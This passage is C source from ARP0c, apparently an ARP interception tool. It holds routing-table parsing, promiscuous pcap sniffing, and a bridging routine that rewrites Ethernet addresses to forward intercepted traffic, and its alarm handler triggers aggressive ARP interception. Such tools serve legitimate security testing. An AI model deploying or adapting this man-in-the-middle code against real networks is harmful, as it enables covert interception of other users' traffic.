	lp[0]='\0'; lp++;
	if (inet_aton(line,(struct in_addr *)&routes[loc_routc].network)==0) {
	    PRINTERR("incorrect entry in routing table file\n");
	    return (-1);
	}

	/* get the netmask */
	if ((lp2=strchr(lp,DELIMITER))==NULL) {
	    PRINTERR("incomplete line in routing table file\n");
	    return (-1);
	}
	lp2[0]='\0'; lp2++;
	if (inet_aton(lp,(struct in_addr *)&routes[loc_routc].netmask)==0) {
	    PRINTERR("incorrect entry in routing table file\n");
	    return (-1);
	}

	/* get gateway */
	if (inet_aton(lp2,(struct in_addr *)&routes[loc_routc].gateway)==0) {
	    PRINTERR("incorrect entry in routing table file\n");
	    return (-1);
	}

	memset(line,0,MAX_LINE_LENGTH);
	loc_routc++;
    }

    fclose(fd);
    routc=loc_routc;

    return 0;
}


/* looks for a routing entry in the table and returns a pointer to
 * the gateway or NULL if local or unknown */
struct in_addr	*routing_find_gateway(struct in_addr *dip) {
    bpf_u_int32		dnet;
    int			i;
    char		no_gw[4] = { 0,0,0,0 };

    memcpy(&dnet,dip,IP_ADDR_LEN);
    for (i=0;i<routc;i++) {
	if ((dnet & routes[i].netmask)==routes[i].network) {
	    if (!memcmp(&(routes[i].gateway),&no_gw,IP_ADDR_LEN)) {
		/* no gateway - means local */
		return NULL;
	    } else {
		return &(routes[i].gateway);
	    }
	}
    }

    return NULL;
}


void	bridge_packet(u_char *frame, int frame_length) {
    struct ether_header		*eth;
    struct iphdr		*ip;
    struct in_addr		*gw;
    struct ether_addr		*ea;
    u_char			*sendbuf;

    ip=(struct iphdr *)(frame+sizeof(struct ether_header));

    if ((gw=routing_find_gateway(&(ip->daddr)))==NULL) {
	/* local packet or gateway unknown */
	if ((ea=arp_find_entry(&(ip->daddr)))==NULL) {
	    /* hw addr unknown - send ARP request and drop this packet */
	    arp_request(&(ip->daddr));
	    return;
	} 
	/* hw addr known .. continue */
    } else {
	/* routed with gateway gw .. */
	if ((ea=arp_find_entry(gw))==NULL) {
	    /* hw addr of gateway unknown - request and drop */
	    arp_request(gw);
	    return;
	}
	/* hw addr known ... continue */
    }

    if (cfg.verbose>2) {
	printf("-- bridge: %s",inet_ntoa(ip->daddr));
	printf(" to %02X:%02X:%02X:%02X:%02X:%02X\n",
		ea->ether_addr_octet[0],
		ea->ether_addr_octet[1],
		ea->ether_addr_octet[2],
		ea->ether_addr_octet[3],
		ea->ether_addr_octet[4],
		ea->ether_addr_octet[5]);
    }

    sendbuf=(u_char *)smalloc(frame_length);
    memcpy(sendbuf,frame,frame_length);
    eth=(struct ether_header *)sendbuf;
    /* replace ethernet frame destination address and send it out ! */
    memcpy(&(eth->ether_dhost),ea,ETH_ALEN);
    /* TEST: replace sender addr as well */
    memcpy(&(eth->ether_shost),&(arps[0].eth),ETH_ALEN);

    send_ethernet_frame(sendbuf,frame_length);

    if (cfg.verbose>1) {
	printf("-- bridged -- %s",inet_ntoa(ip->saddr));
	printf(" -> %s\n",inet_ntoa(ip->daddr));
    }

    free(sendbuf);
}


/* sniffer functions */

/* initialize_pcap(..) sets up all things for pcap
 * NOTE: fills in routes[0]
 * RETURNS: 0 on success or -1 on error */
int	initialize_pcap(void) {
#define FILTER	"arp or ip"
    char                pcap_err[PCAP_ERRBUF_SIZE]; /* buffer for pcap errors */
    struct bpf_program  cfilter;                   /* the compiled filter */

    /* get my network and netmask */
    memset(&routes[0],0,sizeof(routingtable_t));
    if (pcap_lookupnet(cfg.device,
		&routes[0].network,&routes[0].netmask,pcap_err)!=0) {
	fprintf(stderr,"pcap_lookupnet(): %s\n",pcap_err);
	return (-1);
    }

    /* open the sniffer */
    if ((cap=pcap_open_live(cfg.device,CAPLENGTH,
		    1, /* in promi mode */
		    0, /* not timeouts */
		    pcap_err))==NULL) {
	fprintf(stderr,"pcap_open_live(): %s\n",pcap_err);
	return (-1);
    }

    if (pcap_datalink(cap)!=DLT_EN10MB) {
	PRINTERR("ARP0c is for Ethernet only, sorry.\n");
	return (-1);
    }

    if (pcap_compile(cap,&cfilter,FILTER,0,routes[0].netmask)!=0) {
	pcap_perror(cap,"pcap_compile()");
	return (-1);
    }

    if (pcap_setfilter(cap,&cfilter)!=0) {
	pcap_perror(cap,"pcap_setfilter()");
	return (-1);
    }
    
    return 0;
}


/* signal handler */
void	sighandler(int sig) {
    if (sig==SIGHUP) {
	print_tables();
    } else {
	stop_flag++;
	pcap_close(cap);
    }
}


/* alarm handler */
void	alarmhandler(int sig) {
    arp_refresh();
    if (agressive_goflag) 
	arp_agressive_intercept();
    alarm(REFRESH_CHECKS);
}


void usage(char *called) {
    printf("Project ARP0c\n"
	    "$Id: ARP0c2.c,v 1.13 2000/06/25 16:53:44 fx Exp fx $\n\n");
    printf("Usage: %s -i <interface> [-r <routingtable.txt>] [-v[v]]\n",called);
    exit(1);
}


void print_tables(void) {
    
    struct in_addr	temp;		
    int			i;

    printf("Local host:\n"
	    "%20s (%02X:%02X:%02X:%02X:%02X:%02X) ",
	    inet_ntoa(arps[0].ip), 
	    arps[0].eth.ether_addr_octet[0],
	    arps[0].eth.ether_addr_octet[1],
	    arps[0].eth.ether_addr_octet[2],
	    arps[0].eth.ether_addr_octet[3],
	    arps[0].eth.ether_addr_octet[4],
	    arps[0].eth.ether_addr_octet[5]);
    printf("Broadcast: %s\n",inet_ntoa(local_bcast));

    printf("Routing table:\n%20s%20s%20s\n","Network","Netmask","Gateway");
    for (i=0;i<routc;i++) {
	memcpy(&temp,&routes[i].network,sizeof(bpf_u_int32));
	printf("%20s",inet_ntoa(temp));
	memcpy(&temp,&routes[i].netmask,sizeof(bpf_u_int32));
	printf("%20s",inet_ntoa(temp));
	printf("%20s\n",inet_ntoa(routes[i].gateway));
    }

    printf("ARP table:\n");
    for (i=0;i<arpc;i++) {
	printf("%20s",inet_ntoa(arps[i].ip));
	printf("   %02X:%02X:%02X:%02X:%02X:%02X\n",
		arps[i].eth.ether_addr_octet[0],
		arps[i].eth.ether_addr_octet[1],
		arps[i].eth.ether_addr_octet[2],
		arps[i].eth.ether_addr_octet[3],
		arps[i].eth.ether_addr_octet[4],
		arps[i].eth.ether_addr_octet[5]);
    }

    printf("Refresh table:\n");
    for (i=0;i<refc;i++) {
	printf("%20s",inet_ntoa(refs[i].requester_ip));
	printf("   with me as %20s\n",inet_ntoa(refs[i].requested_ip));
    }

}
